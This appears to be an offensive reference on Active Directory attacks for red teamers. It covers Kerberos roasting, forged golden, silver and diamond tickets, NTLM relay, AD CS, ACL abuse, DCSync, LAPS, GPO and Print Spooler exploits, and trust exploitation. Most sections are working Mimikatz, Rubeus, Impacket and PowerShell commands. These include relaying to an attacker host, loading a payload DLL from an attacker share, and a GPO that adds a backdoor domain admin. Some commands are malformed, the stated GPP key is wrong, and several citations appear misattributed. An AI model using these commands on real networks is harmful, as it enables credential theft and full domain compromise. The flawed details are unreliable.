# Active Directory Attacks — Kerberos, NTLM Relay, ACL Abuse, DCSync & Print Spooler Exploits

> A deep-technical reference on the Active Directory attack surface: Kerberos protocol attacks (AS-REP roasting, Kerberoasting, Golden/Silver/Diamond tickets), NTLM relay, LDAP attacks, ACL abuse, DCSync, LAPS bypass, GPO attacks, BloodHound methodology, Print Spooler exploits, and forest/domain trust exploitation. Written for red teamers and AD security researchers.

---

## Table of Contents

1. [Kerberos Protocol Attacks](#1-kerberos-protocol-attacks)
2. [AS-REP Roasting](#2-as-rep-roasting)
3. [Kerberoasting](#3-kerberoasting)
4. [Golden, Silver & Diamond Tickets](#4-golden-silver--diamond-tickets)
5. [NTLM Relay Attacks](#5-ntlm-relay-attacks)
6. [LDAP Attacks](#6-ldap-attacks)
7. [ACL Abuse & DCSync](#7-acl-abuse--dcsync)
8. [LAPS Bypass](#8-laps-bypass)
9. [Group Policy Object Attacks](#9-group-policy-object-attacks)
10. [Print Spooler Attacks](#10-print-spooler-attacks)
11. [Forest & Domain Trust Exploitation](#11-forest--domain-trust-exploitation)
12. [BloodHound Methodology](#12-bloodhound-methodology)

---

## 1. Kerberos Protocol Attacks

### 1.1 Kerberos Protocol Overview

Kerberos is the default authentication protocol in Active Directory, built on a trusted third-party (KDC) model:

```
Kerberos Authentication Flow:
═══════════════════════════════════════════════════════════════
Step 1: AS-REQ (Authentication Service Request)
Client → KDC: AS-REQ(username, timestamp encrypted with user's hash)
KDC verifies user's hash, responds with TGT

Step 2: AS-REP (Authentication Service Reply)  
KDC → Client: AS-REP(TGT encrypted with krbtgt hash, session key encrypted with user's hash)

Step 3: TGS-REQ (Ticket Granting Service Request)
Client → KDC: TGS-REQ(TGT, SPN, authenticator encrypted with session key)
KDC verifies TGT, responds with TGS

Step 4: TGS-REP (Ticket Granting Service Reply)
KDC → Client: TGS-REP(service ticket encrypted with service account's hash, service session key encrypted with TGT session key)

Step 5: AP-REQ (Application Request)
Client → Service: AP-REQ(service ticket, authenticator encrypted with service session key)
Service verifies ticket, responds with AP-REP

═══════════════════════════════════════════════════════════════

Kerberos Tickets:
  TGT (Ticket Granting Ticket): Encrypted with KRBTGT hash, valid for 10 hours by default
  TGS (Ticket Granting Service): Encrypted with service account hash, valid for service access
  PAC (Privilege Attribute Certificate): Contains user's group memberships and privileges
═══════════════════════════════════════════════════════════════

Kerberos Encryption Types:
  RC4-HMAC (23): NTLM hash, weak, commonly supported
  AES-128-CTS-HMAC-SHA1-96 (17): AES-128 key
  AES-256-CTS-HMAC-SHA1-96 (18): AES-256 key, strongest
  DES-CBC-CRC (1): DES, deprecated
  DES-CBC-MD5 (2): DES, deprecated
═══════════════════════════════════════════════════════════════
```

### 1.2 Kerberos Attack Taxonomy

| Attack | Prerequisites | Impact | Difficulty |
|--------|--------------|--------|-----------|
| **AS-REP Roasting** | Username with "Do not require Kerberos preauth" | Offline password cracking | Easy |
| **Kerberoasting** | Any domain user, SPN exists | Offline service account password cracking | Easy |
| **Overpass-the-Hash** | NTLM hash of user | Kerberos TGT for user | Easy |
| **Pass-the-Key** | Kerberos keys of user | Kerberos tickets for user | Easy |
| **Pass-the-Ticket** | Kerberos TGT or TGS | Access to services | Easy |
| **Golden Ticket** | KRBTGT hash, domain SID | Full domain compromise | Medium |
| **Silver Ticket** | Service account hash, domain SID | Service access forgery | Medium |
| **Diamond Ticket** | KRBTGT hash, existing TGT | Modified legitimate TGT | Medium |
| **S4U2Self** | Service account with constrained delegation | Impersonate any user to service | Medium |
| **S4U2Proxy** | Service account with constrained delegation | Access to backend services | Medium |
| **Kerberoasting + Delegation** | SPN + constrained delegation | Full compromise via delegation chain | Hard |
| **Forest Trust Ticket** | Forest trust key | Cross-forest access | Hard |

---

## 2. AS-REP Roasting

### 2.1 Attack Overview

AS-REP roasting targets user accounts that have "Do not require Kerberos preauthentication" enabled. Without preauthentication, the KDC sends an AS-REP containing encrypted data that can be cracked offline:

```
AS-REP Roasting Attack:
1. Enumerate users with "Do not require Kerberos preauth" (DONT_REQ_PREAUTH)
2. Send AS-REQ without preauthentication for each user
3. KDC responds with AS-REP containing encrypted session key
4. The session key is encrypted with the user's NTLM hash
5. Crack the encrypted session key offline using Hashcat/John

AS-REQ without preauthentication:
  KRB_AS_REQ
    pvno: 5
    msg-type: AS-REQ (10)
    padata: NONE (no preauth required)
    req-body:
      cname: username
      realm: CORP.LOCAL
      sname: krbtgt/CORP.LOCAL
      
KDC Response:
  KRB_AS_REP
    pvno: 5
    msg-type: AS-REP (11)
    crealm: CORP.LOCAL
    cname: username
    ticket: TGT (encrypted with krbtgt hash)
    enc-part: EncryptedData (encrypted with USER hash) ← CRACK THIS
```

### 2.2 AS-REP Roasting Commands

```powershell
# Rubeus AS-REP roasting:
Rubeus.exe asreproast /outfile:asrep_hashes.txt /domain:corp.local

# Impacket GetNPUsers:
GetNPUsers.py corp.local/ -usersfile users.txt -format hashcat -outputfile asrep_hashes.txt

# Active Directory enumeration for DONT_REQ_PREAUTH:
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties Name,UserPrincipalName
```

### 2.3 Cracking AS-REP Hashes

```bash
# Hashcat mode 18200 (Kerberos 5 AS-REP type 23)
hashcat -m 18200 asrep_hashes.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt --format=krb5asrep asrep_hashes.txt
```

---

## 3. Kerberoasting

### 3.1 Attack Overview

Kerberoasting targets service accounts with registered SPNs. Any domain user can request a TGS for any SPN, and the TGS is encrypted with the service account's NTLM hash:

```
Kerberoasting Attack:
1. Enumerate accounts with SPNs (servicePrincipalName attribute)
2. Request TGS for each SPN (TGS-REQ)
3. KDC returns TGS encrypted with service account's hash (TGS-REP)
4. The TGS enc-part is encrypted with the service account's hash
5. Crack the TGS offline to recover the service account's password

Key insight: ANY domain user can request TGS tickets for ANY SPN
  - No special privileges required
  - TGS is encrypted with the service account's password hash
  - Can be brute-forced offline
```

```powershell
# Rubeus Kerberoasting:
Rubeus.exe kerberoast /outfile:tgs_hashes.txt /domain:corp.local

# Impacket GetUserSPNs:
GetUserSPNs.py corp.local/user:password -request -outputfile tgs_hashes.txt

# Native PowerShell Kerberoasting:
Add-Type -AssemblyName System.IdentityModel
$spns = Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
foreach ($spn in $spns) {
    foreach ($entry in $spn.ServicePrincipalName) {
        $target = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken $entry
        # TGS ticket is now in the current session's cache
    }
}
# Export tickets with Mimikatz:
mimikatz # kerberos::list /export
# Crack with Hashcat:
hashcat -m 13100 exported_tickets.txt wordlist.txt
```

### 3.2 Kerberoasting Mitigation

```
Kerberoasting Mitigations:
1. Use Managed Service Accounts (gMSA) for SPNs
   - gMSA passwords are automatically rotated every 30 days
   - Password is 240 random characters
   - Not crackable

2. Use strong passwords for service accounts (25+ characters)
   - Even with RC4, 25+ character passwords are infeasible to crack

3. Configure AES-256 encryption for SPNs
   - Set msDS-SupportedEncryptionTypes to 0x18 (AES-128 + AES-256)
   - Disables RC4, forcing stronger encryption

4. Monitor for Kerberoasting activity
   - Event ID 4769 with encryption type 0x17 (RC4)
   - Event ID 4769 with failure code 0x0 (success) for unusual SPNs
   - Large number of TGS requests from single source
```

---

## 4. Golden, Silver & Diamond Tickets

### 4.1 Golden Ticket

A Golden Ticket is a forged TGT created using the KRBTGT hash. It grants unrestricted access to the domain:

```
Golden Ticket Components:
1. Domain name (corp.local)
2. Domain SID (S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX)
3. KRBTGT NTLM hash (from DCSync or NTDS.DIT dump)
4. Target username (any user, including non-existent)
5. Target group memberships (e.g., Domain Admins)

Golden Ticket Properties:
- Cannot be revoked by changing user passwords (KRBTGT hash must be rotated)
- Persists until TGT lifetime expires (default 10 hours, but can be set to 10 years)
- Works across domain trusts if the domain SID matches
- Can be created without domain controller access (only needs KRBTGT hash and domain SID)
```

```powershell
# Mimikatz Golden Ticket:
mimikatz # kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<krbtgt_ntlm_hash> /ptt

# Rubeus Golden Ticket:
Rubeus.exe golden /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<krbtgt_ntlm_hash> /ptt

# Impacket ticketer:
ticketer.py -nthash <krbtgt_hash> -domain-sid S-1-5-21-1234567890-1234567890-1234567890 -domain corp.local Administrator

# After creating Golden Ticket, access domain resources:
# The ticket grants Domain Admin equivalent access
dir \\DC01\C$
psexec \\DC01 cmd.exe
```

### 4.2 Silver Ticket

A Silver Ticket is a forged TGS (service ticket) created using the service account's hash:

```
Silver Ticket Components:
1. Domain name
2. Domain SID
3. Service account NTLM hash (not KRBTGT)
4. Service SPN (e.g., HTTP/web.corp.local, CIFS/dc01.corp.local)
5. Target username

Silver Ticket Properties:
- Grants access to a SPECIFIC SERVICE only (not full domain)
- No communication with KDC required
- Cannot be detected by KDC (since TGS is verified by the service, not the KDC)
- More stealthy than Golden Ticket
- Limited to the service whose hash was compromised
```

```powershell
# Mimikatz Silver Ticket (CIFS access):
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:DC01.corp.local /service:CIFS /rc4:<service_ntlm_hash> /ptt

# Silver Ticket (HTTP access):
mimikatz # kerberos::silver /user:Administrator /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /target:web.corp.local /service:HTTP /rc4:<service_ntlm_hash> /ptt

# After creating Silver Ticket:
dir \\DC01\C$                           ; CIFS Silver Ticket
Invoke-WebRequest http://web.corp.local  ; HTTP Silver Ticket
```

### 4.3 Diamond Ticket

A Diamond Ticket is a modified legitimate TGT, making it more stealthy than a Golden Ticket:

```
Diamond Ticket Attack:
1. Request a legitimate TGT from the KDC (normal AS-REQ)
2. Decrypt the TGT using the KRBTGT hash
3. Modify the PAC (Privilege Attribute Certificate) to add Domain Admins group
4. Re-encrypt the TGT with the KRBTGT hash
5. Inject the modified TGT into the session

Advantage over Golden Ticket:
- The TGT was legitimately obtained from the KDC
- Only the PAC is modified, not the entire ticket
- Less likely to be detected by ticket monitoring
- Ticket timestamps and session keys are legitimate
```

```powershell
# Rubeus Diamond Ticket:
Rubeus.exe diamond /user:normaluser /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<krbtgt_hash> /ptt /groups:512

# Mimikatz Diamond Ticket:
# 1. Request legitimate TGT
Rubeus.exe asktgt /user:normaluser /domain:corp.local /rc4:<password_hash>
# 2. Modify TGT with Mimikatz
mimikatz # kerberos::golden /user:normaluser /domain:corp.local /sid:S-1-5-21-1234567890-1234567890-1234567890 /krbtgt:<krbtgt_hash> /ptt /groups:512 /startoffset:0 /endin:600 /renewmax:10080
```

---

## 5. NTLM Relay Attacks

### 5.1 NTLM Authentication

NTLM (NT LAN Manager) is a challenge-response authentication protocol that predates Kerberos:

```
NTLM Authentication Flow:
1. Client sends NEGOTIATE message (type 1)
2. Server responds with CHALLENGE message (type 2, 8-byte random nonce)
3. Client computes RESPONSE (type 3):
   - NTLMv2: HMAC-MD5(password_hash, challenge + blob)
   - Sends response to server
4. Server validates response against AD or local SAM

NTLM Relay Attack:
1. Attacker intercepts the NTLM authentication
2. Attacker relays the authentication to a target server
3. Target server validates the NTLM response
4. Attacker gains access as the victim user
```

### 5.2 NTLM Relay with Impacket

```bash
# Impacket ntlmrelayx for NTLM relay attacks:
# Step 1: Start ntlmrelayx listener
ntlmrelayx.py -t ldap://DC01.corp.local -wh attacker.corp.local --delegate-access

# Step 2: Trigger authentication from target (various methods):
# Method A: LLMNR/NBT-NS poisoning (Responder)
responder.py -I eth0

# Method B: PrivExchange
python privexchange.py -ah attacker.corp.local -u user -p password -d corp.local DC01.corp.local

# Method C: PetitPotam
python petitpotam.py attacker.corp.local DC01.corp.local

# Method D: Printer Bug
python printerbug.py corp.local/user:password@DC01.corp.local attacker.corp.local

# NTLM relay targets:
ntlmrelayx.py -t smb://target1                    ; Relay to SMB
ntlmrelayx.py -t ldap://DC01.corp.local           ; Relay to LDAP (create computer, grant ACL)
ntlmrelayx.py -t mssql://DB01.corp.local          ; Relay to MSSQL
ntlmrelayx.py -t http://web01.corp.local           ; Relay to HTTP
ntlmrelayx.py -t smtp://mail01.corp.local          ; Relay to SMTP
ntlmrelayx.py -tf targets.txt                       ; Relay to multiple targets
```

### 5.3 LDAP Relay

```
LDAP Relay Attack:
1. Attacker triggers NTLM authentication from DC to attacker
2. ntlmrelayx relays the authentication to LDAP on the DC
3. Since the authentication is from a high-privilege account (e.g., MACHINE$),
   LDAP operations are permitted
4. ntlmrelayx creates a new computer account with constrained delegation
5. Attacker can now impersonate any user to any service

LDAP Relay Commands:
  ntlmrelayx.py -t ldaps://DC01.corp.local --delegate-access
  # Creates a computer account with msDS-AllowedToActOnBehalfOfOtherIdentity
  # Then use Rubeus S4U to impersonate any user
  Rubeus.exe s4u /user:DELEGATE$ /rc4:<hash> /impersonateuser:Administrator /msdsspn:http/web.corp.local /ptt
```

---

## 6. LDAP Attacks

### 6.1 LDAP Enumeration

```powershell
# LDAP enumeration commands:
# Domain information
ldapsearch -x -H ldap://DC01.corp.local -D "corp\\user" -w password -b "DC=corp,DC=local" "(objectClass=domain)"

# User enumeration
ldapsearch -x -H ldap://DC01.corp.local -D "corp\\user" -w password -b "DC=corp,DC=local" "(objectClass=user)" sAMAccountName

# Group enumeration
ldapsearch -x -H ldap://DC01.corp.local -D "corp\\user" -w password -b "DC=corp,DC=local" "(objectClass=group)" sAMAccountName member

# SPN enumeration (Kerberoasting targets)
ldapsearch -x -H ldap://DC01.corp.local -D "corp\\user" -w password -b "DC=corp,DC=local" "(servicePrincipalName=*)"

# Trust enumeration
ldapsearch -x -H ldap://DC01.corp.local -D "corp\\user" -w password -b "DC=corp,DC=local" "(objectClass=trustedDomain)"

# ACL enumeration (find exploitable ACEs)
# Use BloodHound or LDAPShell for comprehensive ACL analysis
```

### 6.2 AD CS (Active Directory Certificate Services) Attacks

```
AD CS Attack Surface:
1. ESC1: Certificate templates that allow client authentication with editable subject
2. ESC2: Certificate templates that allow "Any Purpose" EKU
3. ESC3: Certificate enrollment agents that can issue certificates for other users
4. ESC4: Certificate templates with overly permissive ACLs
5. ESC5: Vulnerable CAs (administrators that can modify CA settings)
6. ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2 flag on CA (allows SAN in any template)
7. ESC7: Certificate authorities with vulnerable ACLs
8. ESC8: NTLM relay to AD CS HTTP endpoints
```

```powershell
# Certipy (AD CS attack tool):
# Enumerate certificate templates
certipy find -u user@corp.local -p password -dc-ip 10.0.0.1

# ESC1: Request certificate with SAN (Subject Alternative Name)
certipy req -u user@corp.local -p password -ca corp-CA -template VulnerableTemplate -upn administrator@corp.local

# ESC6: Request certificate with SAN using EDITF_ATTRIBUTESUBJECTALTNAME2
certipy req -u user@corp.local -p password -ca corp-CA -template User -upn administrator@corp.local

# Authenticate with certificate
certipy auth -pfx administrator.pfx -domain corp.local

# ESC8: NTLM relay to AD CS HTTP endpoint
ntlmrelayx.py -t http://CA01.corp.local/certsrv/certfnsh.asp --adcs
```

---

## 7. ACL Abuse & DCSync

### 7.1 Dangerous Active Directory ACLs

Active Directory ACLs grant permissions that can be abused for privilege escalation:

| ACE | Permission | Impact | Attack Path |
|-----|-----------|--------|-------------|
| `ForceChangePassword` | Change user's password | Reset any user's password | Reset admin password |
| `AddMember` | Add members to group | Elevate any user | Add user to Domain Admins |
| `GenericAll` | Full control over object | Complete compromise | Reset password, add to group |
| `GenericWrite` | Write all properties | Modify any attribute | Set SPN, modify DACL |
| `WriteOwner` | Change object owner | Become owner, grant GenericAll | Become owner of admin account |
| `WriteDacl` | Modify DACL | Modify permissions | Grant GenericAll to self |
| `AllExtendedRights` | All extended rights | Change password, add to group | Same as ForceChangePassword + AddMember |
| `AddSelf` | Add self to group | Group membership escalation | Add self to privileged group |

### 7.2 ACL Abuse Examples

```powershell
# GenericAll on User: Reset password
$cred = New-Object System.Management.Automation.PSCredential("corp.local\Administrator", (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force))
Set-ADAccountPassword -Identity targetuser -NewPassword (ConvertTo-SecureString "P@ssw0rd" -AsPlainText -Force)

# GenericAll on Group: Add user to group
Add-ADGroupMember -Identity "Domain Admins" -Members victimuser

# WriteOwner: Change owner to self, then grant GenericAll
$target = "CN=Target User,DC=corp,DC=local"
Set-ADObject -Identity $target -Replace @{owner="CN=Attacker,CN=Users,DC=corp,DC=local"}
# Now grant GenericAll to self
dsacls $target /G "corp.local\attacker:GA"

# WriteDacl: Grant GenericAll via DACL modification
$target = "CN=Target User,DC=corp,DC=local"
$acl = Get-Acl $target
$rule = New-Object System.DirectoryServices.AccessRule(
    "corp.local\attacker", "GenericAll", "Allow")
$acl.AddAccessRule($rule)
Set-Acl $target $acl

# ForceChangePassword: Reset target user's password
Set-ADAccountPassword -Identity targetuser -NewPassword (ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force) -Reset
```

### 7.3 DCSync Attack

DCSync mimics domain controller replication to extract password hashes without touching NTDS.DIT:

```powershell
# Mimikatz DCSync:
mimikatz # lsadump::dcsync /domain:corp.local /all /csv

# DCSync specific users:
mimikatz # lsadump::dcsync /domain:corp.local /user:Administrator
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt

# Impacket secretsdump:
secretsdump.py corp.local/user:password@DC01.corp.local -just-dc-ntlm

# Required permissions for DCSync:
# The attacking user must have one of:
# 1. Domain Admin (or equivalent)
# 2. Replicating Directory Changes (DS-Replication-Get-Changes)
# 3. Replicating Directory Changes All (DS-Replication-Get-Changes-All)
# 4. Replicating Directory Changes in Filtered Set

# These permissions are typically held by:
# - Domain Admins
# - Enterprise Admins
# - Administrators
# - Any account with Replication permissions (e.g., DFSR$)
```

---

## 8. LAPS Bypass

### 8.1 LAPS Overview

Local Administrator Password Solution (LAPS) manages random local administrator passwords across domain computers:

```
LAPS Architecture:
1. LAPS GPO extension installed on each computer
2. Extension generates random password for local admin
3. Password stored in AD attribute: ms-Mcs-AdmPwd
4. Password expiration stored in AD attribute: ms-Mcs-AdmPwdExpirationTime
5. ACL on ms-Mcs-AdmPwd controls who can read passwords
6. By default, only Domain Admins and custom groups can read

LAPS Bypass Vectors:
1. Read ms-Mcs-AdmPwd on computers where ACL is misconfigured
2. Find computers where LAPS is not installed
3. Find computers where LAPS password has expired
4. Exploit AD permissions to modify LAPS ACL
5. Exploit AD permissions to extend password expiration
6. Force password change (reset ms-Mcs-AdmPwdExpirationTime)
```

### 8.2 LAPS Enumeration and Exploitation

```powershell
# Find computers where LAPS is not installed:
Get-ADComputer -Filter * -Properties * | Where-Object { $_."ms-Mcs-AdmPwd" -eq $null } | Select-Object Name

# Read LAPS passwords (requires ReadPassword permission):
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwd | Where-Object { $_."ms-Mcs-AdmPwd" -ne $null } | Select-Object Name, ms-Mcs-AdmPwd

# Find users with LAPS read permission:
Find-AdmPwdExtendedRights -Identity "OU=Computers,DC=corp,DC=local"

# Find expired LAPS passwords:
Get-ADComputer -Filter * -Properties ms-Mcs-AdmPwdExpirationTime | Where-Object { $_."ms-Mcs-AdmPwdExpirationTime" -lt (Get-Date) }

# Force password reset (requires WritePassword permission):
Set-AdmPwdComputerPassword -ComputerName WS01 -WhenChanged (Get-Date)
```

---

## 9. Group Policy Object Attacks

### 9.1 GPO Attack Surface

```
GPO Attack Vectors:
1. Edit GPO settings (if user has Edit settings permission)
2. Create new GPO (if user has Create GPO permission)
3. Link GPO to OU (if user has Link GPO permission)
4. Modify GPO ACL (if user has Modify ACL permission)
5. Modify GPO in SYSVOL (if user has write access to SYSVOL)
6. Exploit GPO preferences (passwords in GPP)
```

### 9.2 GPO Exploitation

```powershell
# Find GPOs that current user can edit:
Get-ADObject -Filter { objectClass -eq "GroupPolicyContainer" } -Properties * | 
    Where-Object { $_."msDS-PrincipalName" -eq "CORP\user" }

# List all GPOs with edit permissions:
Get-GPO -All | ForEach-Object { 
    $acl = Get-GPPermissions -Guid $_.Id -All
    $acl | Where-Object { $_.Permission -eq "GpoEdit" } | 
        Select-Object -Property @{Name="GPO";Expression={$_.GPODisplayName}}, Trustee, Permission
}

# Create a GPO that executes a command:
# Step 1: Create GPO
New-GPO -Name "Malicious GPO" | New-GPLink -Target "OU=Workstations,DC=corp,DC=local"

# Step 2: Add immediate task (runs once on next policy refresh)
$task = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c net user attacker P@ssw0rd /add /domain"
Set-GPRegistryValue -Name "Malicious GPO" -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Update" -Value "cmd.exe /c net user attacker P@ssw0rd /add /domain"

# GPP Password extraction (passwords in Group Policy Preferences):
# Deprecated but still found in many environments
findstr /S cpassword \\DC01\SYSVOL\corp.local\Policies\*.xml

# Decrypt GPP cpassword:
# GPP passwords are encrypted with AES-256 using a publicly known key
# Microsoft published the key: https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gppref/b8aff061-5014-484a-84c3-0165be5fb4b1
# The key is: 4e 99 06 e8 fc b6 6b c9 ba 0d 1c 96 52 92 3f 95 b8 4e 6a 2e 32 3c 3f c7 fd 06 79 7e 0a e5 cc 7d
```

---

## 10. Print Spooler Attacks

### 10.1 PrintNightmare Variants

```
Print Spooler Attack Variants:
┌──────────────────────────────────────────────────────────────┐
│ CVE-2021-1675 / CVE-2021-34527 (PrintNightmare)                │
│  - Remote code execution via printer driver installation       │
│  - Requires authentication (or network access for RPC)        │
│  - Loads arbitrary DLL as SYSTEM                               │
├──────────────────────────────────────────────────────────────┤
│ Print Spooler Named Pipe Impersonation (PrintSpoofer)        │
│  - SeImpersonatePrivilege to SYSTEM via Print Spooler pipe    │
│  - Creates named pipe \\.\pipe\test                          │
│  - Print Spooler connects to named pipe as SYSTEM            │
│  - Attacker impersonates the SYSTEM client                    │
├──────────────────────────────────────────────────────────────┤
│ Printer Bug (SpoolSample)                                    │
│  - Forces DC to authenticate to attacker via Print Spooler    │
│  - Uses RpcAddPrinter to trigger NTLM auth to attacker       │
│  - Enables NTLM relay attacks against DC                     │
├──────────────────────────────────────────────────────────────┤
│ PetitPotam (MS-EFSRPC)                                       │
│  - Uses Encrypting File System RPC to trigger NTLM auth       │
│  - Similar to Printer Bug but uses different RPC protocol     │
│  - Works when Print Spooler is disabled                       │
└──────────────────────────────────────────────────────────────┘
```

```powershell
# Check if Print Spooler is running:
Get-Service Spooler | Select-Object Name, Status

# PrintNightmare exploit (simplified):
# Use Impacket rpcddump to check for RPC interface:
rpcdump.py -port 445 DC01.corp.local

# Use SharpPrintNightmare:
SharpPrintNightmare.exe \\DC01.corp.local \\attacker\share\payload.dll

# PrintSpoofer (local privilege escalation):
PrintSpoofer.exe -i "cmd /c whoami"

# Printer Bug (force DC authentication):
SpoolSample.exe DC01.corp.local attacker.corp.local

# PetitPotam:
python petitpotam.py attacker.corp.local DC01.corp.local
```

---

## 11. Forest & Domain Trust Exploitation

### 11.1 Trust Types

```
Domain Trust Types:
┌──────────────────────────────────────────────────────────┐
│ Parent-Child Trust                                       │
│  - Automatic, transitive, two-way                         │
│  - child.corp.local trusts corp.local                    │
│  - Can be exploited via SID History injection             │
├──────────────────────────────────────────────────────────┤
│ Tree-Root Trust                                          │
│  - Automatic, transitive, two-way                         │
│  - Between trees in the same forest                      │
├──────────────────────────────────────────────────────────┤
│ External Trust                                           │
│  - Manual, non-transitive, one-way or two-way            │
│  - Between separate forests or NT4 domains               │
├──────────────────────────────────────────────────────────┤
│ Forest Trust                                            │
│  - Manual, transitive between forests                    │
│  - Cross-forest Kerberos authentication                   │
│  - SID Filtering enabled (blocks SID History)            │
├──────────────────────────────────────────────────────────┤
│ Realm Trust                                             │
│  - Manual, between AD and MIT Kerberos realm             │
│  - Used for Unix/Linux integration                       │
└──────────────────────────────────────────────────────────┘
```

### 11.2 Trust Exploitation Techniques

```powershell
# Enumerate domain trusts:
Get-ADTrust -Filter * -Properties TrustType, TrustDirection, SideIdentifier

# Foreign Group Membership (users in other forests with admin privileges):
Get-ADUser -Filter * -Properties ForeignSecurityPrincipal | 
    Where-Object { $_.ForeignSecurityPrincipal -ne $null }

# SID History Injection (Golden Ticket across trust):
# If SID Filtering is disabled, create a Golden Ticket with SID History
# containing the target domain's Enterprise Admins SID
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:S-1-5-21-CHILD_SID /sids:S-1-5-21-PARENT_SID-519 /krbtgt:<krbtgt_hash> /ptt

# Cross-forest Kerberoasting:
# Request TGS for SPNs in trusted forest
GetUserSPNs.py parent.local/user:password -target-domain child.local

# Trust key exploitation:
# Extract trust keys (inter-realm TGT keys)
mimikatz # lsadump::trust /patch
mimikatz # lsadump::dcsync:parent.local /user:parent.local\$
```

---

## 12. BloodHound Methodology

### 12.1 BloodHound Collection and Analysis Workflow

```
BloodHound Attack Methodology:
1. COLLECT
   - Run SharpHound with all collection methods
   - Import JSON data into BloodHound

2. ANALYZE
   - Find shortest path to Domain Admins
   - Identify Kerberoastable accounts
   - Find users with DCSync rights
   - Find computers with unconstrained delegation
   - Identify AS-REP roasting targets
   - Find administrative sessions on valuable targets

3. ATTACK
   - Execute attack path (from BloodHound analysis)
   - Use appropriate technique for each edge
   - escalate privileges along the path

4. REPEAT
   - Re-run SharpHound after each privilege escalation
   - New data reveals new attack paths
   - Continue until Domain Admin is achieved
```

### 12.2 Key BloodHound Cypher Queries

```cypher
// Find all paths to Domain Admins
MATCH p=shortestPath((u:User)-[:AdminTo|HasSession|MemberOf|GenericAll|ForceChangePassword|WriteDacl|WriteOwner|AddMember*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})) RETURN p

// Find computers where Domain Admins have sessions (for credential theft)
MATCH (u:User)-[:MemberOf*1..]->(g:Group {name:"DOMAIN ADMINS@CORP.LOCAL"})
MATCH (u)-[:HasSession]->(c:Computer) RETURN u.name, c.name

// Find users with DCSync rights
MATCH (u:User)-[:GenericAll|WriteDacl|WriteOwner|Owns*1..]->(d:Domain) RETURN u.name

// Find Kerberoastable users with admin rights
MATCH (u:User {hasspn:true})-[:AdminTo|GenericAll*1..]->(c:Computer) RETURN u.name, c.name

// Find unconstrained delegation targets
MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name

// Find constrained delegation paths
MATCH (u:User)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name

// Find users that can reset passwords
MATCH (u:User)-[:ForceChangePassword]->(t:User) RETURN u.name, t.name

// Find owned paths to high-value targets
MATCH p=shortestPath((u:User {owned:true})-[:AdminTo|HasSession|MemberOf|GenericAll*1..]->(t:User {admincount:true})) RETURN p

// Find SQL admin links
MATCH (u:User)-[:SQLAdmin]->(c:Computer) RETURN u.name, c.name
```

---

> **Cross-references**:
> - Mimikatz and credential extraction → `→ 05b_offensive_tooling_infrastructure`
> - Defense evasion techniques → `→ 06b_defense_evasion_lateral`
> - Windows security architecture (tokens, ACLs) → `→ 01b_windows_security_architecture`
> - Windows hardening (LAPS, WDAC) → `→ 07a_windows_hardening_baseline`
> - OSEE AD attack questions → `→ OSEE` track

---

## References

1. MITRE ATT&CK. "Kerberoasting — T1558.003." <https://attack.mitre.org/techniques/T1558/003/>
2. MITRE ATT&CK. "AS-REP Roasting — T1558.004." <https://attack.mitre.org/techniques/T1558/004/>
3. MITRE ATT&CK. "DCSync — T1003.006." <https://attack.mitre.org/techniques/T1003/006/>
4. MITRE ATT&CK. "NTLM Relay — T1557.001." <https://attack.mitre.org/techniques/T1557/001/>
5. National Vulnerability Database. CVE-2021-34527. "PrintNightmare." <https://nvd.nist.gov/vuln/detail/CVE-2021-34527>
6. National Vulnerability Database. CVE-2021-36934. "HiveNightmare." <https://nvd.nist.gov/vuln/detail/CVE-2021-36934>
7. National Vulnerability Database. CVE-2020-1472. "Zerologon — NetLogon EoP." <https://nvd.nist.gov/vuln/detail/CVE-2020-1472>
8. Dedić, K. "Active Directory Attack Methodology." *Harmj0y Blog*, 2021. — Kerberoasting, ACL abuse, and domain escalation technique reference.
9. Chester, A. "Kerberos Attacks Deep Dive." *XPN InfoSec Blog*, 2022. — Golden ticket, silver ticket, and diamond ticket construction.
10. McGarr, C. "AD Exploitation and LAPS Bypass." *Connor McGarr's Blog*, 2023. — LAPS misconfiguration, GPO abuse, and forest trust exploitation.
11. Rasthofer, J. "Rubeus: Kerberos Attack Toolkit." *Harmj0y Blog*, 2021. — Comprehensive Kerberos attack reference including S4U2self/S4U2proxy.
12. Microsoft Learn. "Kerberos Authentication." <https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-authentication-overview>
13. Microsoft Learn. "LAPS Overview." <https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview>
14. DISA. "Windows 10 STIG — Active Directory Domain Controller." <https://www.stigviewer.com/stigs/> — LAPS enforcement, Kerberos hardening, and GPO security baselines.
15. CIS. "Microsoft Windows Server Benchmark — AD Security." *Center for Internet Security*, 2023. — Domain controller hardening, credential protection, and delegation controls.